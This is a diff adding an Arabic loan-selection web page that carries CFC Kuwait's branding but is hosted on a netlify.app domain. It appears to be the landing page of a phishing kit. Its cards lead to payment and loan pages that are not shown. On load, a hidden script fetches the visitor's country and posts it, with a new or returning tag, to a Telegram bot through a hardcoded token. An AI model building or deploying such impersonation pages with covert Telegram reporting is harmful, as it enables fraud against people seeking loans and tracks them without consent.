@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P5H6V926');</script>
+<!-- End Google Tag Manager -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تصميم صفحة</title>
+   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet"> 
+    <meta property="og:title" content="اختر نوع القرض المناسب لك - CFC الكويت" />
+    <meta property="og:description" content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة." />
+    <meta property="og:image" content="https://www.cfc-kw.com/assets/CFC-Logo.jpg" />
+    <meta property="og:url" content="https://tashelatkuwait.netlify.app/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:locale" content="ar_AR" />
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="اختر نوع القرض المناسب لك - CFC الكويت">
+    <meta name="twitter:description" content="احصل على قرض نقدي، قرض سيارة أو قرض شركات بكل سهولة وسرعة.">
+    <meta name="twitter:image" content="https://www.cfc-kw.com/assets/CFC-Logo.jpg">
+
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important; 
+        padding: auto;
+
+        }
+
+.header {
+    width: 100%;
+    height: 100px;
+    background-image: url('cfckuwait.jpg');
+    background-size: cover;     
+    background-position: center; 
+    background-repeat: no-repeat;
+}
+
+
+.cards-container {
+    display: flex;
+    justify-content: flex-end; 
+    gap: 20px; 
+    padding: 20px;
+}
+
+.card {
+    width: 200px;
+    border-radius: 15px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+    overflow: hidden;
+    background-color: #fff;
+    text-align: center;
+    transition: transform 0.3s ease;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+}
+
+.card-image {
+    width: 100%;
+    height: auto; 
+    display: block;
+    border-bottom: 1px solid #eee; 
+}
+
+
+.card-text {
+    padding: 10px;
+    font-size: 16px;
+    color: #333;
+}
+
+#text{
+    text-align: right;
+
+}
+
+#imgau ,#imgau1{
+    width: 100%;
+    margin-top: 150px;
+    margin-bottom: 150px;
+}
+    </style>
+</head>
+
+<body>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P5H6V926"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+<div class="header"></div>
+</div>
+
+<h2 id="text">اختر نوع القرض المطلوب</h2>
+
+<div class="cards-container">
+<div class="card" id="card-commercial">
+    <img src="commercial-loan.jpg" alt="صورة" class="card-image">
+    <div class="card-text">قرض شركات</div>
+</div>
+
+<div class="card" id="card-auto">
+    <img src="auto-loan.jpg" alt="صورة" class="card-image">
+    <div class="card-text">قرض سيارة</div>
+</div>
+
+<div class="card" id="card-cash">
+    <img src="cash-loan.jpg" alt="صورة" class="card-image">
+    <div class="card-text">قرض نقدي</div>
+</div>
+
+</div>
+
+
+<img id="imgau" src="cfcauto.jpg">
+<img id="imgau1" src="CFC-Logo.jpg">
+
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+    
+        document.getElementById("card-commercial").addEventListener("click", function () {
+            window.location.href = "paypy.html";
+        });
+    
+        document.getElementById("card-auto").addEventListener("click", function () {
+            window.location.href = "cashcar.html";
+        });
+    
+        document.getElementById("card-cash").addEventListener("click", function () {
+            window.location.href = "cash1.html";
+        });
+    
+        if (sessionStorage.getItem("telegramSent")) {
+            console.log("الإشعار سبق وتم إرساله.");
+            return;
+        }
+    
+        let visitorType = localStorage.getItem("visitorType");
+        let status = "";
+        if (!visitorType) {
+            localStorage.setItem("visitorType", "old");
+            status = "زبون جديد";
+        } else {
+            status = "زبون قديم";
+        }
+    
+        fetch('https://api.country.is')
+        .then(response => response.json())
+        .then(data => {
+            const country = data.country;
+    
+            const message = `حالة الزائر: ${status}\nالدولة: ${country}`;
+    
+            const telegramToken = "8393679169:AAqq4LyZk6NU49HZsPf7VJRkNMUKNMqXtk";
+            const chatId = "8201670834";
+    
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(res => res.json())
+            .then(res => {
+                console.log("رد التليجرام:", res);
+                sessionStorage.setItem("telegramSent", "true"); // منع التكرار
+            })
+            .catch(err => console.log("خطأ في الإرسال:", err));
+        })
+        .catch(error => {
+            console.log("تعذر الحصول على الدولة:", error);
+        });
+    
+    });
+    </script>
+    
+    
+    
+        
+        
+</body>
+</html>
